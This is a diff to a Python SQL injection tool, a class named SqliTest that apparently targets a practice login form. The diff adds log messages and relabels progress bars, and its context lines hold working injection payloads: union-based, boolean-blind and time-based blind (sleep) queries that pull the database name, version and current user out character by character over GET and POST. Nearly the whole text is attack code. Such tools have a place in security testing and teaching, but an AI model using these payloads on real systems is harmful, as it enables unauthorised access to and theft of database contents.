@@ -38,6 +38,7 @@ class SqliTest(BaseConfig):
             if self.sqlimethod == "normal":
                 # 先注database长度
                 logger.info("The sqlimethod is %s..." % self.sqlimethod)
+                logger.info("Start database length sqli...")
                 # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
                 payload = "user=ddog123' union select 1,length(database())%23&passwd=ddog123&submit=Log+In"
                 r = self.Data.GetData(payload)
@@ -46,6 +47,7 @@ class SqliTest(BaseConfig):
                 print "[*] database_len: %d" % database_len
 
                 # 然后注database
+                logger.info("Start database sqli...")
                 # payload = {"username": "ddog' or select database()%23", "password": "a"}
                 payload = "user=ddog123' union select 1,database()%23&passwd=ddog123&submit=Log+In"
                 r = self.Data.GetData(payload)
@@ -77,7 +79,7 @@ class SqliTest(BaseConfig):
                 # 再注database
                 logger.info("Start database sqli...")
                 for i in range(1, database_len):
-                    for j in trange(100, desc='Database %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
                         payload = "user=user1'%26%26ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
                         if self.Data.GetBuildData(payload, self.len) == 0:
                             database += chr(int(j+30))
@@ -103,7 +105,7 @@ class SqliTest(BaseConfig):
                 # 再注database
                 logger.info("Start database sqli...")
                 for i in range(1, database_len):
-                    for j in trange(100, desc='Database %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
                         payload = "user=ddog123'union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
                             j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
                         if self.Data.GetTimeData(payload, self.time) == 0:
@@ -154,7 +156,7 @@ class SqliTest(BaseConfig):
                 # 再注database
                 logger.info("Start database sqli...")
                 for i in range(1, database_len + 1):
-                    for j in trange(100, desc='Database %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
                         payload = {"user": "user1' && ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1", "passwd": "ddog123"}
                         # payload = "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                         if self.Data.PostBuildData(payload, self.len) == 0:
@@ -182,7 +184,7 @@ class SqliTest(BaseConfig):
                 # 再注database
                 logger.info("Start database sqli...")
                 for i in range(1, database_len + 1):
-                    for j in trange(100, desc='Database %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='Database\'s %dth cahr sqli' % i, leave=False):
                         payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
                             j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                         # payload = "ddog123'&& SELECT if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
@@ -237,7 +239,7 @@ class SqliTest(BaseConfig):
                 # 再注version
                 logger.info("Start version sqli...")
                 for i in range(1, version_len + 1):
-                    for j in trange(100, desc='Version %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
                         payload = "user=user1'%26%26ascii(mid(version()," + repr(i) + ",1))>" + repr(
                             j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
                         if self.Data.GetBuildData(payload, self.len) == 0:
@@ -264,7 +266,7 @@ class SqliTest(BaseConfig):
                 # 再注version
                 logger.info("Start version sqli...")
                 for i in range(1, version_len + 1):
-                    for j in trange(100, desc='Version %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
                         payload = "user=ddog123'union SELECT 1,if((select ascii(mid(version()," + repr(
                             i) + ",1)))>" + repr(
                             j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
@@ -317,7 +319,7 @@ class SqliTest(BaseConfig):
                 # 再注version
                 logger.info("Start version sqli...")
                 for i in range(1, version_len + 1):
-                    for j in trange(100, desc='Version %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
                         payload = {
                             "user": "user1' && ascii(mid(version()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
                             "passwd": "ddog123"}
@@ -347,7 +349,7 @@ class SqliTest(BaseConfig):
                 # 再注version
                 logger.info("Start version sqli...")
                 for i in range(1, version_len + 1):
-                    for j in trange(100, desc='Version %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
                         payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(version()," + repr(
                             i) + ",1)))>" + repr(
                             j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
@@ -404,7 +406,7 @@ class SqliTest(BaseConfig):
                 # 再注user
                 logger.info("Start user sqli...")
                 for i in range(1, user_len + 1):
-                    for j in trange(100, desc='User %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
                         payload = "user=user1'%26%26ascii(mid(user()," + repr(i) + ",1))>" + repr(
                             j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
                         if self.Data.GetBuildData(payload, self.len) == 0:
@@ -431,7 +433,7 @@ class SqliTest(BaseConfig):
                 # 再注user
                 logger.info("Start user sqli...")
                 for i in range(1, user_len):
-                    for j in trange(100, desc='User %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
                         payload = "user=ddog123'union SELECT 1,if((select ascii(mid(user()," + repr(
                             i) + ",1)))>" + repr(
                             j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
@@ -484,7 +486,7 @@ class SqliTest(BaseConfig):
                 # 再注user
                 logger.info("Start user sqli...")
                 for i in range(1, user_len + 1):
-                    for j in trange(100, desc='Version %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
                         payload = {
                             "user": "user1' && ascii(mid(user()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
                             "passwd": "ddog123"}
@@ -514,7 +516,7 @@ class SqliTest(BaseConfig):
                 # 再注user
                 logger.info("Start user sqli...")
                 for i in range(1, user_len):
-                    for j in trange(100, desc='User %dth sqli' % i, leave=False):
+                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
                         payload = {"user": "ddog123' union SELECT 1,if((select ascii(mid(user()," + repr(
                             i) + ",1)))>" + repr(
                             j + 30) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
